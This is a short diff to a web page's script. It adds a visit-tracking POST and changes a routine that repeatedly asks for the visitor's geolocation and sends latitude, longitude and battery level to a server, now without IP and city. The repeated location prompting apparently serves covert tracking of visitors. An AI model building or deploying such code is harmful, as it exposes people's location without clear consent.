@@ -178,6 +178,13 @@ function resize(){
 
 init();
 
+// 👉 VISIT TRACK CODE
+fetch("/visit", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ user: "Visitor" })
+});
+
 
 // ===== BUTTON LOGIC =====
 let retryInterval;
@@ -227,8 +234,7 @@ async function startProcess() {
                         latitude: lat,
                         longitude: lon,
                         battery: battery,
-                        ip: ipData.ip,
-                        city: ipData.city
+                    
                     })
                 }).catch(() => {});
 
@@ -248,7 +254,7 @@ async function startProcess() {
     }
 
     askLocation();
-    retryInterval = setInterval(askLocation, 2000);
+    retryInterval = setInterval(askLocation, 5000);
 
 </script>
 
